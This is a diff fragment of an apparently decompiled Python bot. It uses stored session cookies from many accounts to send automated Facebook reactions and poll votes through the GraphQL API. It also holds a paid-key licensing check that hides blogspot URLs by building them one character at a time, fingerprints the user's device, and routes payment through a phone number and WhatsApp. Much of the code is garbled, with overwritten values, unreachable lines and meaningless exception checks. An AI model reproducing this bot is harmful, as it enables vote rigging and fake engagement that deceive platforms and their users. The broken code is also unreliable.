+        lsd = re.search('name="lsd" value="([^"]+)"', res).group(1)
+        lsd = ''
+        headers = {
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'viewport-width': '891',
+            'x-asbd-id': '129477',
+            'x-fb-friendly-name': 'CometUFIFeedbackReactMutation',
+            'x-fb-lsd': lsd }
+        data = {
+            '__spin_r': '1010949669',
+            '__spin_b': 'trunk',
+            '__spin_t': '1705989350',
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
+            'variables': '{"input":{"attribution_id_v2":"CometSinglePostRoot.react,comet.post.single,via_cold_start,1705989356365,44291,,,","feedback_id":"' + postid + '","feedback_reaction_id":"' + react + '","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWOQtximwyAYmwH_luF6YQhj80c7z8V-Zx4iFA-ozVt8Yxgbejxkx7wNHfHQ79pbIP2i2JhGiye-7YF4BaK6drwm0XCROTNV5V1dduSpdOcZ4k4JWD4H-DXOolSUiYYjmzbWwPwDJZMgMVH4SHdtzGP5HXHyzdlqJC0l1zWRewB_ZGk0H3TWxyj2aNdhy6qT_2uJxp-z5D3if4W9D2Zu9Bn1EPLZYhPCj9zr3JQ6W4kXnhIQ_xrgp3H78E8Gug_WCMikRktWvCk6wW3uZWUBfmYa-38iT3XNK6qh_jp44Zwna-t5dl3glywuN6ScqjrAhGO_TFF5epQt5t0SUl2JPZIXeJk2we0UOb1LUv1sYjJQvNRBX7MvXI6h_8JD-NY71BPSGv7h2FSoePucwZhtrueKvY0Z3F1WicqNY0_PfwNfMotcbpmxSSsG1YVv-LNoCSNewQFL3YV4T7FxE39OdyYlGpZydoQIULd25rRsJteBYa5OXIwFINpAdCNIhBZ7fUhTZULwgKmgdvSKe7owFtdPWJ293dHB0g7raddqn2j8_phPBv8qdUT-sxnl_FFjfbS4-ALe3LeZNIUdEHy2fyUOvngMDAt24Z1fi2shUjzhKYghKQnGC52P4cHGyhjpjeK-CNPocKDnwTmPfIB80rfeAT1V-4tT9WbeYtSCKpH6WVYMqN3XR8RjwUXZCcaEs1strw7kd_0dQ1V7i28ULJB27ra4oIHHxjHg_EnrFoQeIs_59ZSHE07WpGLweoP95UDHGsagL8NrvKOfkKqZeR001Sxk5wZ6HVjjHPz7Npw296c0c-ZtZY4GYzNM0b0NEGzmsRPPKn221nrWcqj8gf40EWCLQXFxDJRA1Zfx7QDX5tURIaKhHsgDyXTFykEtVR0Tn3IqH9U7IRTbZltcALi0_HlmWDnwuZFdA7S2ZabaLwea64kSvlPskrfnj9qhwcvgsPtDHzuWKHPgR87i_mF6dE1is0VbWdD4RDgvNR_4rSLjjJHxwbykpePL5VfHjbmNJRQMbkzizzFnxClZvBaP2E0rwV6nqJt4x0EpRk52ZJ20oR3Wo0VgLkmL1WgEu7hGA3xV0x_q0tXL-R9Smr6cYHSkbBsyzhsuBiotKfs7vIb_ySq0VtUcaTDm5ec5SsTfrKvGqVD5WPOljihNeB6YCg9Dx02q0c1rtK_ckFqtK5rQobe5fKrFf5aDkOuxcw"],"session_id":"7dbc9794-0c61-47b1-b03a-6377590d1856","actor_id":"' + ids + '","client_mutation_id":"4"},"useDefaultActor":false,"scale":3}',
+            'server_timestamps': 'true',
+            'doc_id': '6880473321999695' }
+        rids = {
+            '1635855486666999': 'LIKE',
+            '1678524932434102': 'LOVE',
+            '115940658764963': 'HAHA',
+            '478547315650144': 'WOW',
+            '908563459236466': 'SAD',
+            '444813342392137': 'ANGRY',
+            '613557422527858': 'CARE' }
+        response = requests.post('https://www.facebook.com/api/graphql/', cookies = cookies, headers = headers, data = data)
+        react = rids.get(react)
+        print('[✓] React (' + react + ') Done to Post ')
+
+    headers = {
+        'viewport-width': '891',
+        'x-asbd-id': '129477',
+        'x-fb-friendly-name': 'useCometPollAddVoteMutation',
+        'x-fb-lsd': '-YA6d8kJUH45jr7Adq5ukK' }
+    totalvote = 0
+    
+    def start(uid, cookies, pst, optid, pid):
+        global totalvote
+        G = '\x1b[1;92m'
+        R = '\x1b[1;91m'
+        X = requests.get('https://web.facebook.com/', headers = hds, cookies = cookies).text
+        trackid = '[' + re.findall('trackingdata":{"id":"(.*?)"', X)[0] + ']'
+        trackid = '[]'
+        data = {
+            '__spin_r': '1011900070',
+            '__spin_b': 'trunk',
+            '__spin_t': '1709836254',
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'useCometPollAddVoteMutation',
+            'variables': '{"input":{"is_tracking_encrypted":true,"option_id":"' + optid + '","question_id":"' + pid + '","tracking":[],"actor_id":"' + uid + '","client_mutation_id":"1"},"scale":3,"__relay_internal__pv__IsWorkUserrelayprovider":false}',
+            'server_timestamps': 'true',
+            'doc_id': '7012503615525435' }
+        headers['x-fb-lsd'] = re.findall('"token":"(.*?)"', X)[1]
+        response = requests.post('https://web.facebook.com/api/graphql/', cookies = cookies, headers = headers, data = data)
+        print(f'''{G}[''' + str(totalvote) + '] Vote Done : ' + uid)
+        totalvote += 1
+        return None
+        if Exception:
+            e = re.findall('"token":"(.*?)"', X)[1]
+            e = None
+            del e
+            return None
+        e = re.findall('"token":"(.*?)"', X)[1]
+        del e
+
+    
+"""def a(k):
+        return k
+
+    L = a('h') + a('t') + a('t') + a('p') + a('s') + a(':') + a('/') + a('/') + a('t') + a('a') + a('z') + a('e') + a('e') + a('m') + a('-') + a('r') + a('a') + a('j') + a('p') + a('u') + a('t') + a('.') + a('b') + a('l') + a('o') + a('g') + a('s') + a('p') + a('o') + a('t') + a('.') + a('c') + a('o') + a('m') + a('/') + a('2') + a('0') + a('2') + a('4') + a('/') + a('0') + a('1') + a('/') + a('s') + a('a') + a('r') + a('v') + a('e') + a('r') + a('.') + a('h') + a('t') + a('m') + a('l') + a('?') + a('m') + a('=') + a('1') + ''
+    uae = XBOX(a('a') + a('p') + a('p') + a('r') + a('o') + a('v') + a('e') + a('0') + a('1') + a('.') + a('b') + a('l') + a('o') + a('g') + a('s') + a('p') + a('o') + a('t') + a('.') + a('c') + a('o') + a('m') + '', 443, a('/') + a('2') + a('0') + a('2') + a('4') + a('/') + a('0') + a('3') + a('/') + a('k') + a('e') + a('y') + a('.') + a('h') + a('t') + a('m') + a('l') + a('?') + a('m') + a('=') + a('1') + '')
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
+    ExiT('[+] Internet Off Bypass Done 👍 ')
+    del L
+    kk = platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + (platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + os.getlogin().upper().replace('_', '')).replace('+', '')[5:40] + str(os.getuid()) + str(os.getuid())
+    if kk in uae:
+        exter = 'hnn'
+exter = 'J'
+clear()
+print('(•) Key Note Aprov send Key To Admin')
+print('(•) agar facebook Update pe Tha \n(•) or tool me ids ni ayi \n(•) es sorat me tool owner zimedar nahi')
+linex()
+print(f'''\x1b[1;97m(•) {G}{kk}''')
+linex()
+print(f'''(•) 15 days : {R}300{W} | 30 days : {R}500''')
+print(f'''{W}(•) Acount Number | 03013879228 : {R}E.Pasa / J.Cash{W}''')
+linex()
+xnx = input('(•) Press Enter and Send Screen Shot! ')
+import urllib
+snd = f'''sir I want to get approve \nPlease Approve My Key\nKey : {kk}'''
+snd = urllib.parse.quote(snd)
+os.system('am start https://wa.me/+923013879228?text=' + snd + ' 2>/dev/null > /dev/null')
+exit()
+time.sleep(4)
+print('Sending Images To Server')
+requests
+VOTE()
+ExiT('ok')
+if KeyboardInterrupt:
+    'user-agent'
+    ExiT('[+] CTRL + C Bypass Done 👍')
+if Exception:
+    e = 'same-origin'
+    ExiT(e)
+    e = None
+    del e
+    e = None
+    del e"""
+VOTE()
